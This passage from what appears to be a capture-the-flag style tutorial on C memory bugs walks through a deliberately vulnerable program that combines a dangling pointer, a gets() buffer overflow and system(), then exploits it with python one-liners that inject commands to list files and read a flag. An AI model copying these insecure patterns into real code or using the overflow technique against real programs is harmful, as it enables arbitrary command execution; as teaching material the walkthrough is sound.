    strcpy(helena->cmd, "id");
    printf("I am %s, and my command is %s.\n", helena->name, helena->cmd);
    free(helena);

    struct streamer *guest = (struct streamer*) malloc(sizeof(struct streamer));
    printf("Welcome guest streamer! My command is the best, you have it too!\n");
    strcpy(guest->cmd, helena->cmd);
    printf("What is your name: ");
    gets(guest->name);
    printf("Hello, %s!\n", guest->name);

    printf("I'm going to execute my command now, because I'm cool.\n");
    system(helena->cmd);
    return 0;
}
```

If we look at what the program does, we see that it creates a `struct streamer`
called `helena`. It sets the `helena->name` and `helena->cmd` to static strings
and frees the struct. Next, a `struct streamer` called `guest` is allocated
memory and only the `guest->name` is written to with `gets()`. Finally,
`helena->cmd` is executed through `system()`.

Now, this is a clear case of the dangling pointer vulnerability we talked about
earlier. Also, there is a buffer overflow with the write to `guest->name` with
`gets()`. We can use these two vulnerabilities to write an exploit that executes
arbitrary commands.

```console
$ ./helena
I am Helena, and my command is id.
Welcome guest streamer! My command is the best, you have it too!
What is your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa!
I'm going to execute my command now, because I'm cool.
sh: 1: AAAAAAAAAAa: not found
```

Notice that we can overwrite `helena->cmd` when writing to `guest->name` because
the buffer overflow lets us write past the bounds of `guest->name` to fill
`guest->cmd` and since the dangling pointer lets us use `guest->cmd` as
`helena->cmd`, we can execute anything we want with system.

```console
$ python -c 'print "A"*40+"ls"' | ./helena
I am Helena, and my command is id.
Welcome guest streamer! My command is the best, you have it too!
What is your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls!
I'm going to execute my command now, because I'm cool.
flag.txt  helena  helena.c
```

Seeing that there is a `flag.txt` on the filesystem, we can read it.

```
$ python -c 'print "A"*40+"cat flag.txt"' | ./helena
I am Helena, and my command is id.
Welcome guest streamer! My command is the best, you have it too!
What is your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag.txt!
I'm going to execute my command now, because I'm cool.
Erised{Yay_Simple_b0f_and_d4ngle}
```

And we have our flag.

[//]: # (Links)
[1]: ./formatstring/basic1.c
[2]: ./formatstring/basic2.c
[3]: ./formatstring/basic3.c
[4]: ./formatstring/basic4.c
[5]: ./formatstring/basic5.c
[6]: ./formatstring/basic6.c
[7]: ./formatstring/basic7.c
[8]: ./overunder/over1.c
[9]: ./overunder/under2.c
[10]: ./overunder/over3.c
[11]: ./overunder/gambling4.c
[12]: http://hmarco.org/bugs/CVE-2015-8370-Grub2-authentication-bypass.html
[13]: ./uninitialised/uninit1.c
[14]: http://www.cvedetails.com/cve/CVE-2011-0036/
[15]: ./uninitialised/uninit2.c
[16]: https://blogs.oracle.com/ksplice/entry/much_ado_about_null_exploiting1
[17]: ./illeagle/null1.c
[18]: ./illeagle/outofbounds1.c
[19]: ./illeagle/dangling1.c
[20]: ./illeagle/dangling2.c
[21]: ./closing/helena.c

[//]: # (Images)
[basic2stack]: ./images/basic2stack.png
[basic3stack]: ./images/basic3stack.png
[uninit1before]: ./images/uninit1-firsteat.png
[uninit1during]: ./images/uninit1-everything.png
[uninit1after]: ./images/uninit1-secondeat.png
[dangling1assign]: ./images/dangling1-assign.png
[dangling1slack]: ./images/dangling1-slackoff.png
